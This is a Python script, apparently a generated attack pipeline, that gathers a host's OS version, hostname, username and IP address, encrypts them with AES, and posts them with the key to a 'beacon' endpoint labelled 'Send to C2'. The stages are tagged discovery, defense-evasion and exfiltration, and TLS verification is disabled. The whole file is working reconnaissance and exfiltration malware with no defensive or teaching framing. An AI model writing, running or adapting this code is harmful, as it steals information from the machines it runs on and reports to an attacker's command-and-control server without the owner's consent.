#!/usr/bin/env python3
import sys
import json
import time
import platform
import socket
import getpass
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import requests

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {
        "os_version": None,
        "hostname": None,
        "username": None,
        "local_ip": None
    }
    try:
        # Collect OS version
        result["os_version"] = platform.platform()

        # Collect hostname
        result["hostname"] = socket.gethostname()

        # Collect username
        result["username"] = getpass.getuser()

        # Collect local IP address
        result["local_ip"] = socket.gethostbyname(result["hostname"])

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial results on failure
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Aggregate input data into a single JSON payload
        aggregated_data = {
            "os_version": input_data.get("os_version", ""),
            "hostname": input_data.get("hostname", ""),
            "username": input_data.get("username", ""),
            "local_ip": input_data.get("local_ip", "")
        }
        
        # Convert the aggregated data to a JSON string
        payload = json.dumps(aggregated_data)
        
        # Prepare the result with the required output contract
        result = {
            "payload": payload
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Parse the payload from the input data
        payload_json = input_data.get('payload', '{}')
        payload = json.loads(payload_json)
        
        # Convert payload to bytes
        plaintext = json.dumps(payload).encode()

        # Generate a random AES key and IV
        key = get_random_bytes(32)  # AES-256 requires a 32-byte key
        iv = get_random_bytes(16)   # AES block size for CBC mode is 16 bytes

        # Create AES cipher in CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # Pad the plaintext to a 16-byte boundary and encrypt
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        # Prepare the result dictionary with hex-encoded values
        result = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # On failure, return partial data with None values
        result = {
            'ciphertext': None,
            'iv': None,
            'key': None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and convert input data
        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
        iv = bytes.fromhex(input_data.get('iv', ''))
        key = bytes.fromhex(input_data.get('key', ''))

        # Prepare payload with system information
        payload = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex(),
            'username': getpass.getuser(),
            'hostname': socket.gethostname()
        }

        url = "https://192.168.1.100:4443/beacon"
        success = False
        status_code = 0

        # Attempt to send the payload with retries
        for attempt in range(3):
            try:
                response = requests.post(url, json=payload, timeout=10, verify=False)
                status_code = response.status_code
                if response.status_code == 200:
                    success = True
                    break
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(5)

        result = {'success': success, 'status_code': status_code}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect System Information [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect System Information): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect System Information): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Aggregate Data [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Aggregate Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Aggregate Data): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Encrypt Payload [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Encrypt Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Encrypt Payload): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Send to C2 [exfiltration] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Send to C2): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Send to C2): FAILED — {err}')
            failed.append('T4')
            r2 = task_T4(outputs.get('T3', {}))
            if r2.get('success'):
                outputs['T4'] = r2.get('data', {})
                failed.remove('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))